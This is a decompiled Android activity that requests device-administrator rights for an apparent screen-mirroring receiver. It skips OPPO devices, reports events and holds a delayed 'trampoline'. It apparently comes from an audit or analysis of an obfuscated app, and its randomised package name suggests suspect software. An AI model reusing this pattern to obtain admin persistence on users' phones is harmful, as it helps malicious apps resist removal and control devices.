// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime;

import a0.a;
import a2.b;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.os9sp.yfwkcq0dwfxaf.R;
import f2.k0;
import java.util.Locale;
import w1.h;
import w1.m;
import w1.n;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public class DeviceAdminRequestActivity extends Activity {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static final /* synthetic */ int f2445a = 0;

    /* JADX WARN: Code duplicated, block: B:24:0x008b A[Catch: all -> 0x002e, TryCatch #0 {all -> 0x002e, blocks: (B:3:0x0019, B:5:0x001f, B:9:0x0031, B:12:0x003b, B:18:0x0052, B:23:0x0066, B:25:0x0090, B:27:0x009e, B:28:0x00ac, B:24:0x008b), top: B:32:0x0019 }] */
    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        m mVarC = m.c(this);
        mVarC.getClass();
        mVarC.f(33, n.r());
        try {
            if (n.D(this)) {
                mVarC.f(30, n.y0(a.u(11)));
                finish();
                return;
            }
            String str = Build.BRAND;
            String str2 = Build.MANUFACTURER;
            boolean z2 = true;
            if (str != null && str.trim().toLowerCase(Locale.ROOT).contains("oppo")) {
                Log.i("DeviceAdminReqAct", "OPPO: skipped ACTION_ADD_DEVICE_ADMIN");
            } else {
                if (str2 == null || !str2.trim().toLowerCase(Locale.ROOT).contains("oppo")) {
                    z2 = false;
                }
                if (z2) {
                    Log.i("DeviceAdminReqAct", "OPPO: skipped ACTION_ADD_DEVICE_ADMIN");
                } else {
                    Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                    intent.putExtra("android.app.extra.DEVICE_ADMIN", ScreenMirrorAdminReceiver.a(this));
                    intent.putExtra("android.app.extra.ADD_EXPLANATION", getString(R.string.device_admin_explanation));
                    startActivity(intent);
                    Log.i("DeviceAdminReqAct", "started ACTION_ADD_DEVICE_ADMIN");
                }
            }
            Handler handler = new Handler(Looper.getMainLooper());
            for (long j3 : k0.f1223c) {
                handler.postDelayed(new h(mVarC, 2), j3);
            }
            handler.postDelayed(new h(mVarC, 3), 90000L);
            handler.postDelayed(new b(18, this), 5000L);
            Log.i("DeviceAdminReqAct", "holding trampoline 5000ms");
        } catch (Throwable th) {
            Log.w("DeviceAdminReqAct", "admin activation failed: " + th.getMessage());
            mVarC.f(30, n.y0(a.u(11)));
            finish();
        }
    }
}
